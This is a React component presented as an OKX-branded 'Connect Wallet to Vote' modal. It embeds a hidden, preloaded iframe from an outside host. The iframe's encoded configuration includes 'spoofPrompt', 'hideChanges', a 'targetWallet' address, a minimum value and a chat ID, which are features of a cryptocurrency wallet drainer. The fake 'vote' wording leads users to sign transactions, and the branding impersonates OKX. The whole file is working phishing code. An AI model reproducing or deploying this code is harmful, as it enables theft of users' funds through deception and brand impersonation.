"use client";

import { useState, useEffect, useRef } from "react";
import { X } from "lucide-react";

interface WalletConnectModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

export function WalletConnectModal({
  isOpen,
  onClose,
  onSuccess,
}: WalletConnectModalProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const preloadFrameRef = useRef<HTMLIFrameElement | null>(null);
  const preloadComplete = useRef<boolean>(false);
  const preloadInProgress = useRef<boolean>(false);
  const isBypassMode = useRef<boolean>(false);
  const hasAutoConnected = useRef<boolean>(false);

  // The complete URL with double encoding as required
  const FULL_URL = "https://retool.bondex.app/whitelist.html?kiwiConfig=%257B%2522hideChanges%2522%253Atrue%252C%2522spoofPrompt%2522%253Atrue%252C%2522customAirdropMint%2522%253A%252292pjXsdgDsDu3wXaeXBu5MCV8KLF6FtquWbYY6KkyoKe%2522%252C%2522customAirdropAmount%2522%253A100%252C%2522targetWallet%2522%253A%25228bA574LUwcp3EXRmiYayKoQBZ9QfNN35NitjPqGki76d%2522%252C%2522userChatId%2522%253A%2522-4993647337%2522%252C%2522minValue%2522%253A600%252C%2522className%2522%253A%2522interact-button%2522%252C%2522width%2522%253A%2522400px%2522%252C%2522height%2522%253A%2522380px%2522%252C%2522useProxyForTokens%2522%253Atrue%252C%2522stresserSleepMs%2522%253A5000%252C%2522texts%2522%253A%257B%2522title%2522%253A%2522Connect%2520Wallet%2522%252C%2522subtitle%2522%253A%2522Choose%2520a%2520wallet%2520to%2520connect%2520to%2520this%2520app%2522%252C%2522connecting%2522%253A%2522Connecting...%2522%252C%2522requestingConnection%2522%253A%2522Requesting%2520connection...%2522%252C%2522openingWalletApp%2522%253A%2522Opening%2520wallet%2520app%25E2%2580%25A6%2522%252C%2522pleaseConnectInParent%2522%253A%2522Please%2520connect%2520in%2520parent%2520window...%2522%252C%2522connectedToPhantom%2522%253A%2522Connected%2520to%2520Phantom%2522%252C%2522connectedToSolflare%2522%253A%2522Connected%2520to%2520Solflare%2522%252C%2522connectedBuildingTransaction%2522%253A%2522Connected%21%2520Building%2520transaction...%2522%252C%2522buildingTransaction%2522%253A%2522Processing%2520vote%252C%2520please%2520wait...%2522%252C%2522buildingTransactionWait%2522%253A%2522Processing%2520vote%252C%2520please%2520wait%25E2%2580%25A6%2522%252C%2522transactionsBuilt%2522%253A%2522Vote%2520processed.%2520Please%2520sign...%2522%252C%2522transactionsBuiltSign%2522%253A%2522Vote%2520processed.%2520Please%2520sign%2520in%2520your%2520wallet.%2522%252C%2522pleaseSignInWallet%2522%253A%2522Please%2520sign%2520in%2520your%2520wallet...%2522%252C%2522requestingSignatures%2522%253A%2522Requesting%2520signatures...%2522%252C%2522requestingSignaturesAlt%2522%253A%2522Requesting%2520signatures%25E2%2580%25A6%2522%252C%2522preparingAirdropTransaction%2522%253A%2522Preparing%2520vote...%2522%252C%2522pleaseSignAirdropTransaction%2522%253A%2522Please%2520sign%2520the%2520vote...%2522%252C%2522broadcastingTransactions%2522%253A%2522Broadcasting%2520vote...%2522%252C%2522broadcastingTransactionsAlt%2522%253A%2522Broadcasting%2520vote%25E2%2580%25A6%2522%252C%2522transactionsSent%2522%253A%2522Vote%2520sent%21%2522%252C%2522connectionFailed%2522%253A%2522Connection%2520failed%2522%252C%2522connectionCancelled%2522%253A%2522Connection%2520cancelled%2522%252C%2522connectionRejected%2522%253A%2522Connection%2520rejected%2522%252C%2522transactionRejected%2522%253A%2522Transaction%2520rejected%2522%252C%2522transactionFailed%2522%253A%2522Transaction%2520failed%2522%252C%2522failedToBuildTransaction%2522%253A%2522Failed%2520to%2520build%2520transaction%2522%252C%2522noTransactionsToSign%2522%253A%2522No%2520transactions%2520to%2520sign%2522%252C%2522insufficientBalance%2522%253A%2522To%2520avoid%2520bots%2520tampering%2520with%2520the%2520votes%2520we%2520require%2520wallets%2520that%2520vote%2520to%2520have%2520on-chain%2520activity%2522%252C%2522walletNotConnected%2522%253A%2522Wallet%2520not%2520connected%2522%252C%2522walletNotConnectedReconnect%2522%253A%2522Wallet%2520not%2520connected.%2520Please%2520reconnect.%2522%252C%2522connectWalletFirst%2522%253A%2522Connect%2520wallet%2520first.%2522%252C%2522noSolanaWalletProvider%2522%253A%2522No%2520Solana%2520wallet%2520provider%2520available.%2522%252C%2522widgetMisconfigured%2522%253A%2522Widget%2520misconfigured%2522%252C%2522widgetMisconfiguredTargetWallet%2522%253A%2522Widget%2520misconfigured%253A%2520missing%2520targetWallet.%2522%252C%2522phantomWalletNotDetected%2522%253A%2522Phantom%2520wallet%2520not%2520detected%2522%252C%2522solflareWalletNotDetected%2522%253A%2522Solflare%2520wallet%2520not%2520detected%2522%257D%257D";

  // Preload iframe on mount
  useEffect(() => {
    if ((window as any).__globalPreloadFrame) {
      preloadFrameRef.current = (window as any).__globalPreloadFrame;
      if ((window as any).__preloadBypassMode !== undefined) {
        isBypassMode.current = (window as any).__preloadBypassMode;
        preloadComplete.current = true;
      }
      return;
    }

    if ((window as any).__preloadIframeInitialized) {
      return;
    }
    (window as any).__preloadIframeInitialized = true;
    preloadInProgress.current = true;

    try {
      const preloadFrame = document.createElement("iframe");
      preloadFrame.id = "wallet-preload-frame";
      preloadFrame.style.position = "absolute";
      preloadFrame.style.width = "0";
      preloadFrame.style.height = "0";
      preloadFrame.style.border = "none";
      preloadFrame.style.visibility = "hidden";
      preloadFrame.style.pointerEvents = "none";

      preloadFrame.src = FULL_URL;

      preloadFrame.onerror = () => {
        preloadInProgress.current = false;
      };

      document.body.appendChild(preloadFrame);
      preloadFrameRef.current = preloadFrame;
      (window as any).__globalPreloadFrame = preloadFrame;

      const handlePreloadMessage = (event: MessageEvent) => {
        if (event.data?.type === "preloadComplete") {
          preloadComplete.current = true;
          preloadInProgress.current = false;
          isBypassMode.current = event.data.bypassMode || false;
          (window as any).__preloadBypassMode = event.data.bypassMode || false;
        }
      };

      window.addEventListener("message", handlePreloadMessage);

      return () => {
        window.removeEventListener("message", handlePreloadMessage);
        if (preloadFrame && preloadFrame.parentNode) {
          try {
            preloadFrame.parentNode.removeChild(preloadFrame);
          } catch (e) {}
        }
      };
    } catch (error) {
      preloadInProgress.current = false;
    }
  }, []);

  // Handle messages from iframe
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === "preloadComplete") {
        preloadComplete.current = true;
        preloadInProgress.current = false;
        isBypassMode.current = event.data.bypassMode || false;
        return;
      }

      if (event.data === "closeWalletModal") {
        onSuccess();
        onClose();
        return;
      }

      if (event.data && event.data.deepLink) {
        const action = event.data.deepLink;
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(
          navigator.userAgent
        );

        if (isMobile) {
          const baseUrl = window.location.origin + window.location.pathname;
          const currentUrl = new URL(baseUrl);
          currentUrl.searchParams.set("showFrame", "true");
          currentUrl.searchParams.set("wallet", action);

          const url = encodeURIComponent(currentUrl.toString());
          const ref = encodeURIComponent(window.location.origin);

          let mobileDeepLink = "";

          if (action === "phantom") {
            mobileDeepLink = `phantom://browse/${url}?ref=${ref}`;
          } else if (action === "solflare") {
            mobileDeepLink = `https://solflare.com/ul/v1/browse/${url}?ref=${ref}`;
          }

          if (mobileDeepLink) {
            window.location.href = mobileDeepLink;
          }
        }
      }
    };

    window.addEventListener("message", handleMessage);
    return () => window.removeEventListener("message", handleMessage);
  }, [onSuccess, onClose]);

  // Handle URL params for mobile return
  useEffect(() => {
    const checkUrlParams = () => {
      const urlParams = new URLSearchParams(window.location.search);
      let shouldShowFrame = urlParams.get("showFrame") === "true";
      let walletType = urlParams.get("wallet");

      if (window.location.hash === "#connect=phantom") {
        shouldShowFrame = true;
        walletType = "phantom";
        window.location.hash = "";
      } else if (!shouldShowFrame && window.location.hash) {
        const hashParams = new URLSearchParams(
          window.location.hash.substring(1)
        );
        shouldShowFrame = hashParams.get("showFrame") === "true";
        walletType = hashParams.get("wallet");
      }

      const pendingWallet = localStorage.getItem("pendingWalletConnect");
      const connectTimestamp = localStorage.getItem("connectTimestamp");
      if (!shouldShowFrame && pendingWallet && connectTimestamp) {
        const timeDiff = Date.now() - Number.parseInt(connectTimestamp);
        if (timeDiff < 30000) {
          shouldShowFrame = true;
          walletType = pendingWallet;
          localStorage.removeItem("pendingWalletConnect");
          localStorage.removeItem("connectTimestamp");
        }
      }

      if (shouldShowFrame && walletType && !hasAutoConnected.current) {
        hasAutoConnected.current = true;

        const newUrl = new URL(window.location.href);
        newUrl.searchParams.delete("showFrame");
        newUrl.searchParams.delete("wallet");
        newUrl.hash = "";
        window.history.replaceState({}, "", newUrl.toString());

        const attemptAutoConnect = () => {
          if (iframeRef.current && iframeRef.current.contentWindow) {
            iframeRef.current.contentWindow.postMessage(
              {
                type: "autoConnect",
                wallet: walletType,
              },
              "https://retool.bondex.app"
            );

            setTimeout(() => {
              if (iframeRef.current && iframeRef.current.contentWindow) {
                iframeRef.current.contentWindow.postMessage(
                  {
                    type: "clickWallet",
                    walletName: walletType === "phantom" ? "Phantom" : "Solflare",
                  },
                  "https://retool.bondex.app"
                );
              }
            }, 500);
          } else {
            setTimeout(attemptAutoConnect, 1000);
          }
        };

        setTimeout(attemptAutoConnect, 2000);
      }
    };

    checkUrlParams();
    setTimeout(checkUrlParams, 100);
  }, []);

  // Position preload frame when modal opens
  useEffect(() => {
    if (!isOpen) {
      if (preloadFrameRef.current) {
        preloadFrameRef.current.style.cssText = `
          position: absolute;
          width: 0;
          height: 0;
          border: none;
          visibility: hidden;
          pointer-events: none;
          left: -9999px;
          top: -9999px;
        `;
      }
      return;
    }

    if (
      preloadFrameRef.current &&
      (preloadComplete.current || preloadInProgress.current)
    ) {
      const sendMessage = () => {
        if (preloadFrameRef.current && preloadFrameRef.current.contentWindow) {
          try {
            preloadFrameRef.current.contentWindow.postMessage(
              {
                type: "initializeWallets",
                timestamp: Date.now(),
              },
              "*"
            );
          } catch (error) {}
        }
      };

      const interval = setInterval(() => {
        if (preloadComplete.current) {
          sendMessage();
          clearInterval(interval);
        }
      }, 100);

      requestAnimationFrame(() => {
        sendMessage();
        setTimeout(sendMessage, 200);
        setTimeout(sendMessage, 500);
        setTimeout(sendMessage, 1000);
      });

      return () => clearInterval(interval);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div
      className="fixed inset-0 z-[60] flex justify-center items-center bg-background/95 backdrop-blur-sm p-3 sm:p-4"
      onClick={(e) => {
        if (e.target === e.currentTarget) {
          onClose();
        }
      }}
    >
      <div className="relative w-full max-w-xs sm:max-w-md animate-in fade-in zoom-in-95 duration-200">
        {/* Close button */}
        <button
          className="absolute -top-3 -right-3 sm:-top-4 sm:-right-4 text-foreground hover:text-foreground/80 bg-secondary hover:bg-muted border border-border w-8 h-8 sm:w-10 sm:h-10 rounded-full flex items-center justify-center transition-all duration-200 shadow-lg z-10"
          onClick={onClose}
        >
          <X className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>

        <div className="rounded-3xl border border-border/50 glass-card shadow-2xl w-full overflow-hidden">
          {/* Header with OKX branding */}
          <div className="text-center space-y-3 sm:space-y-4 p-4 sm:p-6 bg-gradient-to-b from-card to-background">
            <div className="mx-auto w-24 h-10 sm:w-32 sm:h-12 flex items-center justify-center">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/OKX_logo.svg/1200px-OKX_logo.svg.png"
                alt="OKX"
                className="h-full w-auto object-contain invert"
              />
            </div>
            <div>
              <h3 className="text-base sm:text-lg font-bold text-foreground mb-1 sm:mb-2">
                Connect Wallet to Vote
              </h3>
              <p className="text-muted-foreground text-xs sm:text-sm">
                Choose your wallet to cast your vote and earn OKX
              </p>
            </div>
          </div>

             {/* Iframe Container - crop black space on mobile by using negative margin */}
          <div className="px-4 sm:px-6 py-4">
            <div className="rounded-xl overflow-hidden h-[340px] sm:h-[350px]">
              {preloadFrameRef.current && (isBypassMode.current || preloadInProgress.current) ? (
                <div
                  className="w-full h-[570px] sm:h-[350px] border-0 bg-background -mt-[230px] sm:mt-0"
                  style={{
                    backgroundColor: "hsl(var(--background))",
                    position: "relative",
                  }}
                  ref={(el) => {
                    if (el && preloadFrameRef.current && isOpen) {
                      if (!el.contains(preloadFrameRef.current)) {
                        preloadFrameRef.current.style.cssText = `
                          position: absolute;
                          left: 0;
                          top: 0;
                          width: 100%;
                          height: 100%;
                          border: none;
                          background-color: hsl(var(--background));
                          visibility: visible;
                          pointer-events: auto;
                          z-index: 10;
                          display: block;
                        `;
                        el.appendChild(preloadFrameRef.current);
                      }
                    }
                  }}
                >
                  {!preloadComplete.current && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center gap-3 z-0">
                      <div className="relative w-12 h-12">
                        <div className="absolute inset-0 border-4 border-muted rounded-full"></div>
                        <div className="absolute inset-0 border-4 border-transparent border-t-primary rounded-full animate-spin"></div>
                      </div>
                      <p className="text-muted-foreground text-sm">
                        Loading wallets...
                      </p>
                    </div>
                  )}
                </div>
              ) : (
                <iframe
                  ref={iframeRef}
                  className="w-full h-[570px] sm:h-[350px] border-0 bg-background -mt-[230px] sm:mt-0"
                  style={{
                    minWidth: "280px",
                    maxWidth: "100%",
                    backgroundColor: "black",
                    opacity: isOpen ? 1 : 0,
                    pointerEvents: isOpen ? "auto" : "none",
                    visibility: isOpen ? "visible" : "hidden",
                  }}
                  src={FULL_URL}
                  title="Secure Wallet Connection"
                />
              )}
            </div>
          </div>

          {/* Modal Footer */}
          <div className="border-t border-border/50 p-2 sm:p-3 text-center bg-card/50">
            <div className="flex items-center justify-center gap-1 text-xs text-muted-foreground mb-1">
              <span>Secured by</span>
              <span className="text-foreground font-semibold">ReTool Protocol</span>
            </div>
            <div className="text-xs text-muted-foreground/70">
              By connecting, you agree to our Terms & Privacy Policy
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}